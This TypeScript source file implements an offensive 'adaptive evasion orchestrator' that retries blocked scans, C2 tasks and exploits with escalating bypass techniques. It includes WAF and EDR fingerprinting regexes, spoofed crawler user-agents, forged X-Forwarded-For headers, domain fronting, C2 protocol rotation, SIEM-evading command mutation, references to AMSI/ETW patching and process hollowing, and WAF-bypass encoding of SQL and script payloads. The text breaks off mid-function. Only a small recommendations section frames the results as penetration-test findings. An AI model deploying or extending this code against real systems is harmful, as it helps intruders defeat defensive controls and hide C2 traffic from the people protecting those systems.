// @ts-nocheck
/**
 * Adaptive Evasion Orchestrator
 * ═════════════════════════════
 * Core engine that wraps scanning, C2, and exploit operations with
 * progressive evasion escalation. When an attempt is blocked, the
 * orchestrator automatically steps through increasingly aggressive
 * evasion techniques until bypass succeeds, then records findings.
 *
 * Flow:  attempt → blocked? → escalate technique → retry → record result
 *
 * Three domains:
 *   1. Scanning (WAF bypass)  — header rotation, UA spoofing, encoding, rate throttling
 *   2. C2 Tasks (EDR bypass)  — payload transforms, sleep jitter, protocol rotation, AMSI/ETW patches
 *   3. Exploit Exec (WAF+EDR) — payload obfuscation, staged delivery, encoding chains
 */

import {
  generateMutations,
  type MutationVariant,
  type MutationCategory,
} from "./siem-mutation-engine";
import {
  buildPipeline,
  EVASION_TECHNIQUES,
  type EvasionProfile,
  type TransformPipeline,
} from "./payload-transform-pipeline";

// ═══════════════════════════════════════════════════════════════════════
// §1 — TYPES & INTERFACES
// ═══════════════════════════════════════════════════════════════════════

export type EvasionDomain = "scanning" | "c2" | "exploit";

export type BlockSignal =
  | "http_403"
  | "http_406"
  | "http_429"
  | "http_503"
  | "captcha"
  | "waf_page"
  | "connection_reset"
  | "connection_timeout"
  | "empty_response"
  | "signature_match"
  | "process_killed"
  | "amsi_block"
  | "edr_quarantine"
  | "sandbox_detected"
  | "unknown_block";

export type EscalationResult = "bypassed" | "blocked" | "partial" | "error";

export interface EvasionAttempt {
  attemptNumber: number;
  techniqueId: string;
  techniqueName: string;
  techniqueCategory: string;
  description: string;
  timestamp: number;
  result: EscalationResult;
  blockSignal?: BlockSignal;
  responseCode?: number;
  responseSnippet?: string;
  latencyMs: number;
  mutationApplied?: string;
  pipelineProfile?: EvasionProfile;
}

export interface EvasionFinding {
  id: string;
  domain: EvasionDomain;
  target: string;
  operation: string;
  startedAt: number;
  completedAt: number;
  totalAttempts: number;
  finalResult: EscalationResult;
  successfulTechnique?: {
    id: string;
    name: string;
    category: string;
    description: string;
    escalationLevel: number;
  };
  defensesDetected: string[];
  attempts: EvasionAttempt[];
  evasionScorecard: {
    totalTechniquesTried: number;
    techniquesBlocked: number;
    techniquesBypassed: number;
    escalationDepth: number;
    maxEscalationLevel: number;
    bypassRate: number;
    defenseEffectiveness: number;
  };
  recommendations: string[];
}

export interface OrchestratorConfig {
  maxAttempts: number;
  delayBetweenAttempts: number; // ms
  jitterRange: number; // ms — random jitter added to delay
  abortOnFirstSuccess: boolean;
  recordAllAttempts: boolean;
  domain: EvasionDomain;
}

// ═══════════════════════════════════════════════════════════════════════
// §2 — BLOCK DETECTION
// ═══════════════════════════════════════════════════════════════════════

/** Signatures that indicate a WAF block page */
const WAF_SIGNATURES = [
  { pattern: /cloudflare/i, waf: "Cloudflare" },
  { pattern: /akamai/i, waf: "Akamai" },
  { pattern: /imperva|incapsula/i, waf: "Imperva/Incapsula" },
  { pattern: /aws\s*waf|awselb/i, waf: "AWS WAF" },
  { pattern: /mod_security|modsec/i, waf: "ModSecurity" },
  { pattern: /sucuri/i, waf: "Sucuri" },
  { pattern: /barracuda/i, waf: "Barracuda" },
  { pattern: /f5\s*big-?ip|asm/i, waf: "F5 BIG-IP ASM" },
  { pattern: /fortiweb|fortigate/i, waf: "Fortinet" },
  { pattern: /palo\s*alto/i, waf: "Palo Alto" },
  { pattern: /access\s*denied|request\s*blocked|security\s*violation/i, waf: "Generic WAF" },
  { pattern: /captcha|challenge|verify.*human/i, waf: "CAPTCHA Challenge" },
];

/** EDR signatures that indicate endpoint detection */
const EDR_SIGNATURES = [
  { pattern: /crowdstrike|falcon/i, edr: "CrowdStrike Falcon" },
  { pattern: /sentinelone|sentinel/i, edr: "SentinelOne" },
  { pattern: /carbon\s*black|vmware.*edr/i, edr: "VMware Carbon Black" },
  { pattern: /defender|microsoft.*antimalware/i, edr: "Windows Defender" },
  { pattern: /cylance/i, edr: "Cylance" },
  { pattern: /sophos/i, edr: "Sophos" },
  { pattern: /kaspersky/i, edr: "Kaspersky" },
  { pattern: /bitdefender/i, edr: "Bitdefender" },
  { pattern: /malwarebytes/i, edr: "Malwarebytes" },
  { pattern: /eset/i, edr: "ESET" },
];

/**
 * Detect what kind of block occurred based on HTTP response or error info.
 */
export function detectBlockSignal(response: {
  statusCode?: number;
  body?: string;
  error?: string;
  headers?: Record<string, string>;
}): { blocked: boolean; signal: BlockSignal; defenses: string[] } {
  const defenses: string[] = [];

  // Check HTTP status codes
  if (response.statusCode === 403) {
    const wafMatch = response.body ? WAF_SIGNATURES.find(s => s.pattern.test(response.body!)) : null;
    if (wafMatch) defenses.push(wafMatch.waf);
    return { blocked: true, signal: "http_403", defenses };
  }
  if (response.statusCode === 406) return { blocked: true, signal: "http_406", defenses: ["Input Validation"] };
  if (response.statusCode === 429) return { blocked: true, signal: "http_429", defenses: ["Rate Limiter"] };
  if (response.statusCode === 503) {
    const wafMatch = response.body ? WAF_SIGNATURES.find(s => s.pattern.test(response.body!)) : null;
    if (wafMatch) defenses.push(wafMatch.waf);
    return { blocked: true, signal: "http_503", defenses };
  }

  // Check body for WAF pages
  if (response.body) {
    for (const sig of WAF_SIGNATURES) {
      if (sig.pattern.test(response.body)) {
        defenses.push(sig.waf);
      }
    }
    if (defenses.length > 0) return { blocked: true, signal: "waf_page", defenses };
  }

  // Check headers for WAF indicators
  if (response.headers) {
    const serverHeader = response.headers["server"] || response.headers["Server"] || "";
    const wafHeader = response.headers["x-waf-status"] || response.headers["x-sucuri-id"] || "";
    for (const sig of WAF_SIGNATURES) {
      if (sig.pattern.test(serverHeader) || sig.pattern.test(wafHeader)) {
        defenses.push(sig.waf);
      }
    }
    if (defenses.length > 0) return { blocked: true, signal: "waf_page", defenses };
  }

  // Check for connection-level blocks
  if (response.error) {
    if (/ECONNRESET|connection reset/i.test(response.error)) {
      return { blocked: true, signal: "connection_reset", defenses: ["Network Firewall"] };
    }
    if (/ETIMEDOUT|timeout/i.test(response.error)) {
      return { blocked: true, signal: "connection_timeout", defenses: ["Network Firewall"] };
    }
    if (/ECONNREFUSED/i.test(response.error)) {
      return { blocked: true, signal: "connection_reset", defenses: ["Host Firewall"] };
    }

    // EDR-specific blocks
    for (const sig of EDR_SIGNATURES) {
      if (sig.pattern.test(response.error)) {
        defenses.push(sig.edr);
      }
    }
    if (/killed|terminated|quarantine/i.test(response.error)) {
      return { blocked: true, signal: defenses.length > 0 ? "edr_quarantine" : "process_killed", defenses };
    }
    if (/amsi|antimalware/i.test(response.error)) {
      return { blocked: true, signal: "amsi_block", defenses: defenses.length > 0 ? defenses : ["AMSI"] };
    }
    if (/sandbox|emulat/i.test(response.error)) {
      return { blocked: true, signal: "sandbox_detected", defenses: ["Sandbox Detection"] };
    }
  }

  // Empty response can indicate silent drop
  if (!response.body && !response.error && response.statusCode === undefined) {
    return { blocked: true, signal: "empty_response", defenses: ["Silent Drop"] };
  }

  return { blocked: false, signal: "unknown_block", defenses };
}

// ═══════════════════════════════════════════════════════════════════════
// §3 — EVASION TECHNIQUE LADDERS
// ═══════════════════════════════════════════════════════════════════════

/**
 * Each domain has an ordered escalation ladder of techniques.
 * The orchestrator walks up the ladder when attempts are blocked.
 */

export interface EscalationTechnique {
  id: string;
  name: string;
  category: string;
  level: number; // 1 = lightest, 5 = most aggressive
  description: string;
  applicableTo: EvasionDomain[];
  mitreTechnique?: string;
  /** Function that transforms the operation parameters for this technique */
  apply: (context: EscalationContext) => EscalationContext;
}

export interface EscalationContext {
  // Scanning context
  url?: string;
  headers?: Record<string, string>;
  method?: string;
  body?: string;
  userAgent?: string;
  delay?: number;
  encoding?: string;
  proxy?: string;

  // C2 context
  command?: string;
  payload?: Buffer | string;
  transport?: string;
  sleepInterval?: number;
  jitter?: number;
  pipelineProfile?: EvasionProfile;

  // Exploit context
  exploitPayload?: string;
  stager?: string;
  obfuscationLevel?: number;

  // Shared
  metadata: Record<string, any>;
}

/** User-Agent rotation pool — diverse browser/OS combinations */
const UA_POOL = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
];

/** Build the full escalation ladder for all domains */
export const ESCALATION_LADDER: EscalationTechnique[] = [
  // ── Level 1: Minimal evasion (scanning) ──────────────────────────
  {
    id: "ua_rotation",
    name: "User-Agent Rotation",
    category: "header_manipulation",
    level: 1,
    description: "Rotate User-Agent strings to avoid fingerprint-based blocking",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1071.001",
    apply: (ctx) => ({
      ...ctx,
      userAgent: UA_POOL[Math.floor(Math.random() * UA_POOL.length)],
      headers: {
        ...ctx.headers,
        "User-Agent": UA_POOL[Math.floor(Math.random() * UA_POOL.length)],
      },
      metadata: { ...ctx.metadata, evasion_ua_rotated: true },
    }),
  },
  {
    id: "header_normalization",
    name: "Header Normalization & Spoofing",
    category: "header_manipulation",
    level: 1,
    description: "Add legitimate-looking headers (Accept, Referer, Accept-Language) to mimic real browser traffic",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1071.001",
    apply: (ctx) => ({
      ...ctx,
      headers: {
        ...ctx.headers,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": ctx.url ? new URL(ctx.url).origin + "/" : "https://www.google.com/",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
      },
      metadata: { ...ctx.metadata, evasion_headers_normalized: true },
    }),
  },
  // ── Level 1: Minimal evasion (C2) ────────────────────────────────
  {
    id: "sleep_jitter",
    name: "Sleep Jitter Randomization",
    category: "timing",
    level: 1,
    description: "Randomize callback intervals to avoid periodic-beacon detection",
    applicableTo: ["c2"],
    mitreTechnique: "T1029",
    apply: (ctx) => ({
      ...ctx,
      sleepInterval: (ctx.sleepInterval || 30000) + Math.floor(Math.random() * 15000),
      jitter: Math.floor(Math.random() * 40) + 10, // 10-50% jitter
      metadata: { ...ctx.metadata, evasion_jitter_applied: true },
    }),
  },
  // ── Level 2: Moderate evasion ────────────────────────────────────
  {
    id: "rate_throttle",
    name: "Adaptive Rate Throttling",
    category: "timing",
    level: 2,
    description: "Slow down request rate and add random delays to evade rate-limiting WAFs",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1029",
    apply: (ctx) => ({
      ...ctx,
      delay: (ctx.delay || 0) + 2000 + Math.floor(Math.random() * 3000),
      metadata: { ...ctx.metadata, evasion_throttled: true },
    }),
  },
  {
    id: "url_encoding",
    name: "URL/Parameter Encoding",
    category: "encoding",
    level: 2,
    description: "Double-encode or use alternative encodings for URL parameters to bypass WAF pattern matching",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1027",
    apply: (ctx) => ({
      ...ctx,
      encoding: "double_url",
      url: ctx.url ? doubleEncodeParams(ctx.url) : ctx.url,
      metadata: { ...ctx.metadata, evasion_encoding: "double_url" },
    }),
  },
  {
    id: "protocol_rotation",
    name: "C2 Protocol Rotation",
    category: "protocol",
    level: 2,
    description: "Switch C2 transport protocol (mTLS → HTTPS → DNS → WireGuard) to evade protocol-specific detection",
    applicableTo: ["c2"],
    mitreTechnique: "T1071",
    apply: (ctx) => {
      const protocols = ["mtls", "https", "dns", "wg"];
      const currentIdx = protocols.indexOf(ctx.transport || "https");
      const nextProtocol = protocols[(currentIdx + 1) % protocols.length];
      return {
        ...ctx,
        transport: nextProtocol,
        metadata: { ...ctx.metadata, evasion_protocol: nextProtocol },
      };
    },
  },
  {
    id: "command_mutation",
    name: "Command Mutation (SIEM Bypass)",
    category: "mutation",
    level: 2,
    description: "Apply case/path/encoding mutations to commands to evade SIEM detection rules",
    applicableTo: ["c2", "exploit"],
    mitreTechnique: "T1027",
    apply: (ctx) => {
      if (!ctx.command) return ctx;
      const mutations = generateMutations(ctx.command, {
        maxPerCategory: 1,
        categories: ["case_mutation", "env_var_substitution", "encoding_mutation"],
      });
      const bestMutation = mutations[0];
      return {
        ...ctx,
        command: bestMutation ? bestMutation.mutated : ctx.command,
        metadata: {
          ...ctx.metadata,
          evasion_mutation: bestMutation?.category || "none",
          evasion_original_command: ctx.command,
        },
      };
    },
  },
  // ── Level 3: Aggressive evasion ──────────────────────────────────
  {
    id: "ip_header_spoof",
    name: "IP Header Spoofing",
    category: "header_manipulation",
    level: 3,
    description: "Add X-Forwarded-For, X-Real-IP, and X-Originating-IP headers with internal/trusted IPs",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1090",
    apply: (ctx) => {
      const spoofedIp = `10.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
      return {
        ...ctx,
        headers: {
          ...ctx.headers,
          "X-Forwarded-For": spoofedIp,
          "X-Real-IP": spoofedIp,
          "X-Originating-IP": spoofedIp,
          "X-Client-IP": spoofedIp,
          "CF-Connecting-IP": spoofedIp,
          "True-Client-IP": spoofedIp,
        },
        metadata: { ...ctx.metadata, evasion_ip_spoofed: spoofedIp },
      };
    },
  },
  {
    id: "payload_transform_low",
    name: "Payload Transform — Low Profile",
    category: "payload",
    level: 3,
    description: "Apply shellcode conversion and string encryption to evade static signature detection",
    applicableTo: ["c2", "exploit"],
    mitreTechnique: "T1027.009",
    apply: (ctx) => ({
      ...ctx,
      pipelineProfile: "low" as EvasionProfile,
      obfuscationLevel: 1,
      metadata: { ...ctx.metadata, evasion_pipeline: "low" },
    }),
  },
  {
    id: "http_method_override",
    name: "HTTP Method Override",
    category: "protocol",
    level: 3,
    description: "Use X-HTTP-Method-Override or alternative methods to bypass method-based WAF rules",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1071.001",
    apply: (ctx) => ({
      ...ctx,
      method: "POST",
      headers: {
        ...ctx.headers,
        "X-HTTP-Method-Override": ctx.method || "GET",
        "X-Method-Override": ctx.method || "GET",
      },
      metadata: { ...ctx.metadata, evasion_method_override: true },
    }),
  },
  {
    id: "chunked_transfer",
    name: "Chunked Transfer Encoding",
    category: "encoding",
    level: 3,
    description: "Split request body into small chunks to evade WAF body inspection that operates on full buffers",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1027",
    apply: (ctx) => ({
      ...ctx,
      headers: {
        ...ctx.headers,
        "Transfer-Encoding": "chunked",
      },
      metadata: { ...ctx.metadata, evasion_chunked: true },
    }),
  },
  // ── Level 3: Aggressive C2 evasion ───────────────────────────────
  {
    id: "domain_fronting",
    name: "Domain Fronting",
    category: "protocol",
    level: 3,
    description: "Route C2 traffic through legitimate CDN domains to evade network-level inspection",
    applicableTo: ["c2"],
    mitreTechnique: "T1090.004",
    apply: (ctx) => ({
      ...ctx,
      headers: {
        ...ctx.headers,
        "Host": "legitimate-cdn.example.com",
      },
      metadata: { ...ctx.metadata, evasion_domain_fronting: true },
    }),
  },
  // ── Level 4: Heavy evasion ───────────────────────────────────────
  {
    id: "payload_transform_medium",
    name: "Payload Transform — Medium Profile",
    category: "payload",
    level: 4,
    description: "Apply shellcode conversion + direct syscalls + process injection to evade EDR hooks",
    applicableTo: ["c2", "exploit"],
    mitreTechnique: "T1055",
    apply: (ctx) => ({
      ...ctx,
      pipelineProfile: "medium" as EvasionProfile,
      obfuscationLevel: 2,
      metadata: { ...ctx.metadata, evasion_pipeline: "medium" },
    }),
  },
  {
    id: "advanced_mutation",
    name: "Advanced Command Mutation",
    category: "mutation",
    level: 4,
    description: "Apply all mutation categories including path mutation, argument reorder, string concatenation, and interpreter chains",
    applicableTo: ["c2", "exploit"],
    mitreTechnique: "T1027",
    apply: (ctx) => {
      if (!ctx.command) return ctx;
      const mutations = generateMutations(ctx.command, {
        maxPerCategory: 2,
        categories: [
          "case_mutation", "path_mutation", "env_var_substitution",
          "encoding_mutation", "separator_mutation", "argument_mutation",
          "alias_substitution", "whitespace_mutation", "string_concat",
        ],
      });
      // Pick the mutation with the most transformation
      const bestMutation = mutations.sort((a, b) =>
        (b.mutated.length - b.mutated.length) - (a.mutated.length - a.mutated.length)
      )[0];
      return {
        ...ctx,
        command: bestMutation ? bestMutation.mutated : ctx.command,
        metadata: {
          ...ctx.metadata,
          evasion_advanced_mutation: bestMutation?.category || "none",
          evasion_original_command: ctx.metadata.evasion_original_command || ctx.command,
        },
      };
    },
  },
  {
    id: "waf_bypass_payloads",
    name: "WAF Bypass Payload Variants",
    category: "encoding",
    level: 4,
    description: "Use null bytes, unicode normalization, and mixed encoding to bypass WAF pattern matching",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1027",
    apply: (ctx) => ({
      ...ctx,
      encoding: "mixed_bypass",
      body: ctx.body ? applyWafBypassEncoding(ctx.body) : ctx.body,
      metadata: { ...ctx.metadata, evasion_waf_bypass_encoding: true },
    }),
  },
  // ── Level 5: Maximum evasion ─────────────────────────────────────
  {
    id: "payload_transform_high",
    name: "Payload Transform — High Profile",
    category: "payload",
    level: 5,
    description: "Full evasion pipeline: shellcode + syscalls + NTDLL unhook + ETW patch + AMSI bypass + code signing + process hollowing",
    applicableTo: ["c2", "exploit"],
    mitreTechnique: "T1055.012",
    apply: (ctx) => ({
      ...ctx,
      pipelineProfile: "high" as EvasionProfile,
      obfuscationLevel: 3,
      metadata: { ...ctx.metadata, evasion_pipeline: "high" },
    }),
  },
  {
    id: "full_header_evasion",
    name: "Full Header Evasion Suite",
    category: "header_manipulation",
    level: 5,
    description: "Combine all header techniques: UA rotation, IP spoofing, method override, custom headers, and cache busting",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1071.001",
    apply: (ctx) => {
      const spoofedIp = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
      return {
        ...ctx,
        userAgent: UA_POOL[Math.floor(Math.random() * UA_POOL.length)],
        headers: {
          ...ctx.headers,
          "User-Agent": UA_POOL[Math.floor(Math.random() * UA_POOL.length)],
          "X-Forwarded-For": spoofedIp,
          "X-Real-IP": spoofedIp,
          "X-Originating-IP": `127.0.0.1`,
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
          "Accept-Encoding": "gzip, deflate",
          "Connection": "keep-alive",
          "Cache-Control": "no-cache",
          "Pragma": "no-cache",
          "X-Custom-Header": `req-${Date.now()}`,
        },
        metadata: { ...ctx.metadata, evasion_full_header_suite: true },
      };
    },
  },
  {
    id: "staged_delivery",
    name: "Staged Payload Delivery",
    category: "payload",
    level: 5,
    description: "Split exploit into small staged components — initial dropper fetches encrypted payload from separate channel",
    applicableTo: ["exploit"],
    mitreTechnique: "T1104",
    apply: (ctx) => ({
      ...ctx,
      stager: "multi_stage",
      metadata: { ...ctx.metadata, evasion_staged: true, evasion_stages: 3 },
    }),
  },
];

// ═══════════════════════════════════════════════════════════════════════
// §4 — HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════

function doubleEncodeParams(url: string): string {
  try {
    const parsed = new URL(url);
    const params = new URLSearchParams(parsed.search);
    const newParams = new URLSearchParams();
    for (const [key, value] of params) {
      newParams.set(key, encodeURIComponent(value));
    }
    parsed.search = newParams.toString();
    return parsed.toString();
  } catch {
    return url;
  }
}

function applyWafBypassEncoding(body: string): string {
  // Apply various WAF bypass encoding tricks
  return body
    .replace(/select/gi, "SeLeCt")
    .replace(/union/gi, "UnIoN")
    .replace(/script/gi, "scr\u0000ipt")
    .replace(/<\//g, "<\\/")
    .replace(/'/g, "%27")
    .replace(/"/g, "%22");
}

function generateFindingId(): string {
  return `evf-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ═══════════════════════════════════════════════════════════════════════
// §5 — CORE ORCHESTRATOR
// ═══════════════════════════════════════════════════════════════════════

const DEFAULT_CONFIG: OrchestratorConfig = {
  maxAttempts: 12,
  delayBetweenAttempts: 500,
  jitterRange: 300,
  abortOnFirstSuccess: true,
  recordAllAttempts: true,
  domain: "scanning",
};

/**
 * Get the escalation ladder for a specific domain, sorted by level.
 */
export function getEscalationLadder(domain: EvasionDomain): EscalationTechnique[] {
  return ESCALATION_LADDER
    .filter(t => t.applicableTo.includes(domain))
    .sort((a, b) => a.level - b.level);
}

/**
 * The core adaptive evasion loop.
 *
 * @param domain    — scanning | c2 | exploit
 * @param target    — target identifier (URL, hostname, session ID)
 * @param operation — description of what we're trying to do
 * @param initialContext — starting context for the operation
 * @param executeFn — the actual operation function; returns response info for block detection
 * @param config    — orchestrator configuration
 */
export async function runEvasionLoop(
  domain: EvasionDomain,
  target: string,
  operation: string,
  initialContext: EscalationContext,
  executeFn: (ctx: EscalationContext) => Promise<{
    success: boolean;
    statusCode?: number;
    body?: string;
    error?: string;
    headers?: Record<string, string>;
    data?: any;
  }>,
  config: Partial<OrchestratorConfig> = {},
): Promise<EvasionFinding> {
  const cfg = { ...DEFAULT_CONFIG, ...config, domain };
  const ladder = getEscalationLadder(domain);
  const attempts: EvasionAttempt[] = [];
  const defensesDetected = new Set<string>();
  const startedAt = Date.now();
  let currentContext = { ...initialContext, metadata: { ...initialContext.metadata } };
  let successfulTechnique: EvasionFinding["successfulTechnique"] | undefined;
  let finalResult: EscalationResult = "blocked";

  // Attempt 0: Try without any evasion first
  {
    const t0 = Date.now();
    try {
      const response = await executeFn(currentContext);
      const latency = Date.now() - t0;

      if (response.success) {
        attempts.push({
          attemptNumber: 0,
          techniqueId: "none",
          techniqueName: "No Evasion (Baseline)",
          techniqueCategory: "baseline",
          description: "Initial attempt without evasion techniques",
          timestamp: t0,
          result: "bypassed",
          responseCode: response.statusCode,
          latencyMs: latency,
        });
        finalResult = "bypassed";
        successfulTechnique = {
          id: "none",
          name: "No Evasion Required",
          category: "baseline",
          description: "Target did not block the initial attempt — no evasion needed",
          escalationLevel: 0,
        };
      } else {
        const blockInfo = detectBlockSignal(response);
        blockInfo.defenses.forEach(d => defensesDetected.add(d));
        attempts.push({
          attemptNumber: 0,
          techniqueId: "none",
          techniqueName: "No Evasion (Baseline)",
          techniqueCategory: "baseline",
          description: "Initial attempt without evasion techniques",
          timestamp: t0,
          result: "blocked",
          blockSignal: blockInfo.signal,
          responseCode: response.statusCode,
          responseSnippet: response.body?.substring(0, 200),
          latencyMs: latency,
        });
      }
    } catch (err: any) {
      const latency = Date.now() - t0;
      const blockInfo = detectBlockSignal({ error: err.message });
      blockInfo.defenses.forEach(d => defensesDetected.add(d));
      attempts.push({
        attemptNumber: 0,
        techniqueId: "none",
        techniqueName: "No Evasion (Baseline)",
        techniqueCategory: "baseline",
        description: "Initial attempt without evasion techniques",
        timestamp: t0,
        result: "error",
        blockSignal: blockInfo.signal,
        latencyMs: latency,
      });
    }
  }

  // If baseline succeeded and we abort on first success, return early
  if (finalResult === "bypassed" && cfg.abortOnFirstSuccess) {
    return buildFinding(domain, target, operation, startedAt, attempts, defensesDetected, successfulTechnique, finalResult, ladder.length);
  }

  // Progressive escalation through the ladder
  for (let i = 0; i < Math.min(ladder.length, cfg.maxAttempts); i++) {
    const technique = ladder[i];

    // Apply the evasion technique to the context
    currentContext = technique.apply(currentContext);

    // Add jittered delay between attempts
    const jitter = Math.floor(Math.random() * cfg.jitterRange);
    await sleep(cfg.delayBetweenAttempts + jitter);

    const t0 = Date.now();
    try {
      const response = await executeFn(currentContext);
      const latency = Date.now() - t0;

      if (response.success) {
        attempts.push({
          attemptNumber: i + 1,
          techniqueId: technique.id,
          techniqueName: technique.name,
          techniqueCategory: technique.category,
          description: technique.description,
          timestamp: t0,
          result: "bypassed",
          responseCode: response.statusCode,
          latencyMs: latency,
          mutationApplied: currentContext.metadata.evasion_mutation || currentContext.metadata.evasion_advanced_mutation,
          pipelineProfile: currentContext.pipelineProfile,
        });
        finalResult = "bypassed";
        successfulTechnique = {
          id: technique.id,
          name: technique.name,
          category: technique.category,
          description: technique.description,
          escalationLevel: technique.level,
        };
        if (cfg.abortOnFirstSuccess) break;
      } else {
        const blockInfo = detectBlockSignal(response);
        blockInfo.defenses.forEach(d => defensesDetected.add(d));
        attempts.push({
          attemptNumber: i + 1,
          techniqueId: technique.id,
          techniqueName: technique.name,
          techniqueCategory: technique.category,
          description: technique.description,
          timestamp: t0,
          result: "blocked",
          blockSignal: blockInfo.signal,
          responseCode: response.statusCode,
          responseSnippet: response.body?.substring(0, 200),
          latencyMs: latency,
          mutationApplied: currentContext.metadata.evasion_mutation || currentContext.metadata.evasion_advanced_mutation,
          pipelineProfile: currentContext.pipelineProfile,
        });
      }
    } catch (err: any) {
      const latency = Date.now() - t0;
      const blockInfo = detectBlockSignal({ error: err.message });
      blockInfo.defenses.forEach(d => defensesDetected.add(d));
      attempts.push({
        attemptNumber: i + 1,
        techniqueId: technique.id,
        techniqueName: technique.name,
        techniqueCategory: technique.category,
        description: technique.description,
        timestamp: t0,
        result: "error",
        blockSignal: blockInfo.signal,
        latencyMs: latency,
      });
    }
  }

  return buildFinding(domain, target, operation, startedAt, attempts, defensesDetected, successfulTechnique, finalResult, ladder.length);
}

function buildFinding(
  domain: EvasionDomain,
  target: string,
  operation: string,
  startedAt: number,
  attempts: EvasionAttempt[],
  defensesDetected: Set<string>,
  successfulTechnique: EvasionFinding["successfulTechnique"],
  finalResult: EscalationResult,
  maxLadderSize: number,
): EvasionFinding {
  const bypassed = attempts.filter(a => a.result === "bypassed").length;
  const blocked = attempts.filter(a => a.result === "blocked").length;
  const maxLevel = Math.max(...attempts.map(a => {
    const tech = ESCALATION_LADDER.find(t => t.id === a.techniqueId);
    return tech?.level || 0;
  }), 0);

  const recommendations: string[] = [];
  const defenseList = [...defensesDetected];

  if (finalResult === "blocked") {
    recommendations.push("All evasion techniques were blocked — target has robust defense-in-depth.");
    if (defenseList.length > 0) {
      recommendations.push(`Detected defenses: ${defenseList.join(", ")}. Consider manual testing with custom techniques.`);
    }
    recommendations.push("Review the escalation timeline to identify which defense layer blocked each technique.");
  } else if (finalResult === "bypassed" && successfulTechnique) {
    if (successfulTechnique.escalationLevel === 0) {
      recommendations.push("No defenses detected — target appears unprotected. Consider recommending WAF/EDR deployment.");
    } else {
      recommendations.push(`Bypass achieved at escalation level ${successfulTechnique.escalationLevel}/5 using "${successfulTechnique.name}".`);
      recommendations.push(`${blocked} technique(s) were blocked before bypass — defense has partial coverage.`);
      if (defenseList.length > 0) {
        recommendations.push(`Detected defenses (${defenseList.join(", ")}) should be tuned to detect "${successfulTechnique.name}" technique.`);
      }
    }
  }

  return {
    id: generateFindingId(),
    domain,
    target,
    operation,
    startedAt,
    completedAt: Date.now(),
    totalAttempts: attempts.length,
    finalResult,
    successfulTechnique,
    defensesDetected: defenseList,
    attempts,
    evasionScorecard: {
      totalTechniquesTried: attempts.length,
      techniquesBlocked: blocked,
      techniquesBypassed: bypassed,
      escalationDepth: maxLevel,
      maxEscalationLevel: 5,
      bypassRate: attempts.length > 0 ? Math.round((bypassed / attempts.length) * 100) : 0,
      defenseEffectiveness: attempts.length > 0 ? Math.round((blocked / attempts.length) * 100) : 0,
    },
    recommendations,
  };
}

// ═══════════════════════════════════════════════════════════════════════
// §6 — DOMAIN-SPECIFIC WRAPPERS
// ═══════════════════════════════════════════════════════════════════════

/**
 * Run an evasion-aware HTTP scan against a target URL.
 * Wraps an HTTP request with progressive WAF bypass escalation.
 */
export async function evasionScan(
  targetUrl: string,
  scanOperation: string,
  httpFn: (url: string, headers: Record<string, string>, options: {
    method?: string;
    body?: string;
    delay?: number;
    encoding?: string;
  }) => Promise<{ statusCode: number; body: string; headers: Record<string, string> }>,
  config?: Partial<OrchestratorConfig>,
): Promise<EvasionFinding> {
  const initialContext: EscalationContext = {
    url: targetUrl,
    headers: {},
    method: "GET",
    metadata: {},
  };

  return runEvasionLoop(
    "scanning",
    targetUrl,
    scanOperation,
    initialContext,
    async (ctx) => {
      try {
        const result = await httpFn(
          ctx.url || targetUrl,
          ctx.headers || {},
          {
            method: ctx.method,
            body: ctx.body,
            delay: ctx.delay,
            encoding: ctx.encoding,
          },
        );
        // Consider 2xx and 3xx as success, everything else as potential block
        const success = result.statusCode >= 200 && result.statusCode < 400;
        return {
          success,
          statusCode: result.statusCode,
          body: result.body,
          headers: result.headers,
        };
      } catch (err: any) {
        return { success: false, error: err.message };
      }
    },
    config,
  );
}

/**
 * Run an evasion-aware C2 task execution.
 * Wraps a C2 command with progressive EDR bypass escalation.
 */
export async function evasionC2Task(
  sessionTarget: string,
  command: string,
  taskFn: (command: string, options: {
    transport?: string;
    sleepInterval?: number;
    jitter?: number;
    pipelineProfile?: EvasionProfile;
